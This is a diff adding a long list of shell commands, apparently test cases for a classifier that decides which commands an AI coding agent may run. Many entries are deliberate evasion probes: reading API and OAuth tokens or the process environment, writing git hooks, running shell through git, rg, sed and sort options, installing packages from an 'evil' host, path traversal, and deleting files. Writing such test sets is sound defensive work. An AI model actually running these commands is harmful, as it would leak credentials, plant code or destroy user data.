@@ -1,0 +1,526 @@
+( cd /etc; ls )
+biome format /etc/x
+bun add -g x
+bun add evil
+bun install
+bun run --cwd /etc x
+bun run x
+bun test
+bun test --cwd=/etc
+bun x evil
+cargo run
+cargo test --manifest-path /etc/x
+cat -- /etc/hosts
+cat -n /etc/hosts
+cat ../../etc/hosts
+cat .git
+cat .GIT/config
+cat @G/config
+cat @G/HEAD
+cat @LOC/s?c/../../other/secret.txt
+cat /dev/null
+cat /dev/random
+cat /dev/stdin
+cat /dev/tty
+cat /etc/hosts
+cat /proc/self/environ
+cat /tmp/*/../../etc/hosts
+cat < /etc/hosts
+cat lnk/secret.txt
+cat src/*/../../../other/secret.txt
+cd ..
+cd @OTHER && ls
+cd /etc
+cd /tmp && cat ../etc/hosts
+cd /tmp; cat ../etc/hosts
+cd ~
+command ls
+cp --target-directory @G/hooks a
+cp --target-directory=@G/hooks a
+cp --target-directory=@LOC a
+cp --target=@G/hooks a
+cp -r /etc @LOC/x
+cp -t /etc a
+cp -t.g*/hooks a
+cp -t@G/hooks a
+cp -t/etc a
+cp -vt@G/hooks a
+cp -vt/etc a
+cp @OTHER/secret.txt @LOC/x
+cp /etc/hosts /tmp/x
+cp a .?it/hooks/x
+cp a .[g]it/hooks/x
+cp a ./@G/../@G/hooks/x
+cp a .g*/hooks/x
+cp a .Git/config
+cp a @G*
+cp a /dev/null
+cp a b/../../../etc/x
+cp a lnk/x
+cp a src/../@G/hooks/pre-commit
+cp a src/*/@G/hooks/x
+cp a x --parents
+cut -f1 /etc/hosts
+date -s x
+diff -r /etc .
+diff /etc/hosts a
+echo '$(id)'
+echo "$(id)"
+echo "$SSH_AUTH_SOCK"
+echo `ls`
+echo $((1))
+echo $(env)
+echo ${ANTHROPIC_API_KEY}
+echo ${x:-$(id)}
+echo $CLAUDE_CODE_OAUTH_TOKEN
+echo x > a
+echo x 2>/dev/null
+env ls
+exec ls
+file -f /etc/x
+file -m /etc/x
+find . -delete
+find . -exec rm {} +
+find . -execdir x ;
+find . -fls x
+find . -fprint x
+find . -fprintf x %p
+find . -name x -print
+find . -newer /etc/hosts
+find . -ok rm {} ;
+find . -regex x
+find /etc -name x
+FOO=1 ls
+gh api x
+gh auth status
+gh auth token
+gh issue create
+gh issue list -w
+gh issue view -w
+gh pr checkout 1
+gh pr checks --watch
+gh pr checks -w
+gh pr close
+gh pr comment 1
+gh pr create
+gh pr diff --patch
+gh pr diff --web
+gh pr list --json x
+gh pr list --search x
+gh pr list --web
+gh pr list -R evil/x
+gh pr list -w
+gh pr merge
+gh pr status
+gh pr view
+gh pr view --jq x
+gh pr view --json title -q .title
+gh pr view --json x
+gh pr view --repo x/y
+gh pr view --template x
+gh pr view --web
+gh pr view -R x/y
+gh pr view -w
+gh pr view 1 --comments
+gh repo view --web
+gh repo view -w
+gh repo view x/y
+git --no-optional-locks status
+git --no-pager -c core.pager=x log
+git --no-pager log
+git --no-pager status
+git -P log
+git -P status
+git add -A
+git add -f @G/config
+git add -p
+git add .
+git am x
+git apply --directory=@G x
+git apply x
+git archive -o /etc/x HEAD
+git bisect start
+git blame --ignore-revs-file=/etc/x a
+git blame -f a
+git blame -L1,2 a
+git blame -m --contents=/etc/passwd a
+git blame /etc/hosts
+git branch --delete x
+git branch --move a b
+git branch -c a b
+git branch -D x
+git branch -dD x
+git branch -Dd x
+git branch -f x HEAD
+git branch -fm a b
+git branch -m --output=x
+git branch -m a b
+git branch -m evil
+git bundle create /etc/x HEAD
+git cat-file -p HEAD
+git checkout -
+git checkout -- a
+git checkout --detach
+git checkout --force x
+git checkout --merge x
+git checkout --no-guess x
+git checkout --orphan x
+git checkout --ours a
+git checkout --theirs a
+git checkout -b x
+git checkout -bf x
+git checkout -f
+git checkout -fb x
+git checkout -m x
+git checkout -p
+git checkout -q x
+git checkout ./a
+git checkout *
+git checkout HEAD -- a
+git checkout HEAD src
+git checkout HEAD~1
+git checkout main
+git checkout main a
+git checkout origin/main
+git checkout src
+git cherry-pick --abort
+git cherry-pick --continue
+git cherry-pick -n x
+git cherry-pick HEAD~3
+git clean -fdx
+git clean -n
+git commit --amend --no-edit
+git commit --template=/etc/passwd
+git commit -a -m x
+git commit -F /etc/hosts
+git commit -m x
+git commit -m x -- a
+git commit -S
+git config --get x
+git config user.name
+git daemon
+git describe
+git diff --cached
+git diff --check
+git diff --color-moved
+git diff --diff-filter=D
+git diff --ext-diff
+git diff --find-renames=50
+git diff --name-only
+git diff --no-index /etc/passwd /dev/null
+git diff --no-index a b
+git diff --output-indicator-new=x
+git diff --output=x
+git diff --relative
+git diff --stat
+git diff --stat=100
+git diff --submodule
+git diff --textconv
+git diff --word-diff=color
+git diff -c
+git diff -m --ext-diff
+git diff -m --no-index /etc/passwd /dev/null
+git diff -m -O/etc/x
+git diff -M50%
+git diff -O/etc/x
+git diff -R
+git diff -t --output=x
+git diff -U3
+git diff -w
+git diff -z
+git diff HEAD~1 -- a
+git difftool
+git fetch
+git fetch -- origin
+git fetch --all
+git fetch --depth --upload-pack=x origin
+git fetch --depth=1 origin
+git fetch --prune origin
+git fetch --recurse-submodules origin
+git fetch --refmap= origin
+git fetch --tags
+git fetch --unshallow
+git fetch --update-head-ok origin
+git fetch --upload-pack=x origin
+git fetch -f origin
+git fetch -p
+git fetch -t --upload-pack=sh
+git fetch -t --upload-pack=sh origin
+git fetch -u origin
+git fetch a/b
+git fetch origin
+git fetch origin --upload-pack=x
+git fetch origin +x
+git fetch origin main
+git fetch origin refs/heads/a:refs/heads/b
+git fetch origin x:y
+git fetch ssh://x
+git filter-branch
+git for-each-ref
+git for-each-ref --format=x
+git format-patch -o /etc HEAD~1
+git gc
+git grep x
+git hash-object -w a
+git help log
+git instaweb
+git log --all
+git log --date --output=x
+git log --depth --output=x
+git log --exec=x
+git log --ext-diff
+git log --follow a
+git log --format --output=x
+git log --format=%H
+git log --graph --oneline
+git log --no-pager
+git log --out
+git log --out=x
+git log --output x
+git log --output=x
+git log --pretty --output=x
+git log --since --output=x
+git log --skip --output=x
+git log -fo
+git log -L1,2:a
+git log -m --ext-diff
+git log -m --output=@G/config -1 --format=%B
+git log -m --output=x
+git log -m -c --output=x
+git log -m -P
+git log -m @G
+git log -n --output=x
+git log -O/etc/x
+git log -p
+git log -p -- /etc/hosts
+git log -S --output=x
+git log -S x
+git log -t --output=x
+git log -U --output=x
+git ls-files --others
+git ls-files -z
+git ls-files /etc
+git merge --abort
+git merge x
+git mergetool
+git mv a b
+git prune
+git pull
+git push
+git push origin x
+git rebase --continue
+git rebase -i HEAD
+git reflog
+git reflog expire --all
+git remote
+git remote --verbose
+git remote --verbose add x y
+git remote -v
+git remote -v --foo
+git remote -v set-url origin x
+git remote -v show
+git remote add -v x y
+git remote get-url --all origin
+git remote origin
+git remote rename a b
+git remote set-branches origin x
+git remote show -n origin
+git remote show origin
+git remote update
+git reset --hard
+git reset --soft HEAD~3
+git reset -q --hard
+git reset HEAD
+git reset HEAD~3
+git restore --staged a
+git restore a
+git rev-parse --absolute-git-dir
+git rev-parse --git-dir
+git rev-parse --git-path hooks
+git rev-parse --resolve-git-dir=/etc/x
+git rev-parse --show-toplevel
+git rev-parse HEAD
+git revert HEAD
+git rm a
+git shortlog
+git show --no-pager
+git show --output=x
+git show --pretty=format:%H
+git show --stat
+git show --textconv HEAD
+git show -m --output=@G/config
+git show -m --textconv
+git show -O x
+git show -t -m --output=a
+git show HEAD:a
+git stash --include-untracked
+git stash -u
+git stash apply
+git stash branch x
+git stash clear
+git stash create
+git stash drop
+git stash list
+git stash pop
+git stash push -m x
+git stash show
+git stash show -p
+git stash store x
+git status
+git status --ignored
+git status --porcelain
+git status --renames
+git status --untracked-files=all
+git status -s
+git status -sb
+git status -uno
+git submodule update
+git switch -
+git switch --detach x
+git switch --discard-changes x
+git switch --merge x
+git switch --orphan x
+git switch -c x
+git switch -C x
+git switch -d x
+git switch -fc x
+git switch -m x
+git switch main
+git symbolic-ref HEAD refs/heads/x
+git tag -a x -m y
+git tag -F /etc/hosts v
+git tag -fa x
+git tag x
+git update-ref -d refs/heads/x
+git var -l
+git version
+git worktree add --lock x
+git worktree add -B x ../wt/x
+git worktree add -f x
+git worktree add @LOC/../wt/x
+git worktree add @OTHER/wt
+git worktree add /Users/x/evil
+git worktree list
+git worktree lock x
+git worktree move a b
+git worktree repair
+git worktree unlock a
+go test -exec x
+grep --exclude-from=/etc/hosts x a
+grep -f /etc/hosts x a
+grep -r x /
+grep -rn x ..
+head -c1 /etc/hosts
+head -n1 -- /etc/hosts
+less --lesskey-file=x a
+less -o x a
+less a
+ls -- --x
+ls -d ..*
+ls -d ../*
+ls -l /etc
+ls -la
+ls -R /
+ls .?
+ls ..{,}
+ls .{.,}
+ls ./.*
+ls "$HOME/x"
+ls {/etc,/tmp}
+ls @G
+ls @G/hooks
+ls /
+ls /dev
+ls /e{tc}
+ls /etc/
+ls /private/tmp
+ls /tmp
+ls /Users
+ls /var/folders
+ls &> x
+ls <>x
+ls >(x)
+ls >/dev/null
+ls >&2
+ls >| x
+ls ~root
+ls $'abc'
+ls ${HOME}
+ls $HOME
+ls 2>&1
+mkdir -m777 x
+mkdir -p /etc/x
+mkdir @G
+mkdir /tmp/x
+mv -t@G/hooks a
+mv /tmp/x @LOC/a
+mv a lnk/x
+npm --prefix /etc test
+npm i evil
+npm install --prefix=/etc
+npm install https://evil/x.tgz
+npm install x
+npm run x
+pnpm --dir /etc test
+pnpm -C /etc test
+printenv
+printf %s "$GH_TOKEN"
+printf x >& x
+printf x >&-x
+printf x >&1d/../@G/config
+printf x >&1d/../x
+printf x >&2
+printf x >&2d/y
+printf x | tee a
+pytest --rootdir=/etc -p x
+pytest -c /etc/x
+rg --files /etc
+rg --hostname-bin=x x
+rg --no-config x
+rg --pre sh x
+rg --pre=sh x
+rg --search-zip x
+rg -f /etc/hosts x
+rg -z x
+rg x --ignore-file=/etc/x
+sed -i 1d a
+sed -n -e 's/a/b/e' a
+sed -n -f /etc/x
+sed -n '1p;w x' a
+sed -n 'w x' a
+sed -n 1p -e 's/a/b/e' a
+sed -n 1p /etc/hosts
+sed -ne p a
+sed -s -n --file=x
+sed 's/a/b/ew' a
+sed 's/a/b/w x' a
+sed 1e id
+set
+sort --compress-program=sh a
+sort --out=a a
+sort --output=a a
+sort -k1 -o a a
+sort -o a a
+sort -ou a
+sort -T /etc a
+stat -f x a
+tail -f a
+test -f x
+time ls
+touch -r /etc/hosts x
+touch .gi{t}/hooks/x
+touch .GIT/x
+touch @G
+touch @G/hooks/pre-commit
+touch /tmp/x
+tree --fromfile x
+tree -o x
+tsc --outDir /etc
+tsc --outFile /etc/x
+tsc -p x --outDir /etc
+uniq -- a b
+uniq a /dev/null
+uniq a b
+wc --files0-from=/etc/x
+x=1
+yarn --cwd /etc test
